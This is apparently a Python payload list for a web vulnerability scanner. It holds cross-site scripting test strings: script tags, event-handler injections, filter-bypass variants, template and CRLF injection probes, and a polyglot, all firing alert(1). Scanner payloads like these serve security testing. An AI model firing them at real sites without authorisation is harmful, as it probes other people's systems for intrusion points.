# XSS payloads for the scanner

XSS_PAYLOADS = [
    # Basic XSS payloads
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload='alert(1)'>",
    
    # Event handlers
    "<body onload='alert(1)'>",
    "<input autofocus onfocus='alert(1)'>",
    "<iframe onload='alert(1)'>",
    
    # JavaScript pseudo-protocol
    "javascript:alert(1)",
    
    # HTML-encoded payloads
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    
    # URL-encoded payloads
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    
    # Character escaping
    "<script>alert('\\x58\\x53\\x53')</script>",
    
    # Mixed case to bypass filters
    "<ScRiPt>alert(1)</sCrIpT>",
    
    # Exotic payloads
    "<div onclick='alert(1)' style='width:100%;height:100%;position:fixed;left:0;top:0;background-color:transparent;z-index:9999;'></div>",
    "<details open ontoggle='alert(1)'>",
    
    # DOM-based payloads
    "'/><img src=x onerror=alert(1)>",
    "'\"</script><script>alert(1)</script>",
    
    # Filter bypass payloads
    "<svg><animate onbegin=alert(1) attributeName=x></animate>",
    "<svg><set attributeName='onmouseover' to='alert(1)' /></svg>",
    
    # CSS-based XSS
    "<style>@keyframes x{}</style><xss style='animation-name:x' onanimationstart='alert(1)'></xss>",
    
    # Template injection
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    
    # AngularJS specific
    "{{7*7}}",
    "<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click me</div>",
    
    # React specific
    "<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>",
    
    # Various combinations
    "' onmouseover='alert(1)",
    "\" onmouseover=\"alert(1)",
    
    # Content-sniffing XSS
    "><script>alert(1)</script>",
    "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
    
    # Headers injection
    "Content-Type: text/html\r\n\r\n<script>alert(1)</script>",
    
    # CRLF injection
    "\r\n<script>alert(1)</script>",
    
    # Special characters
    "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
]
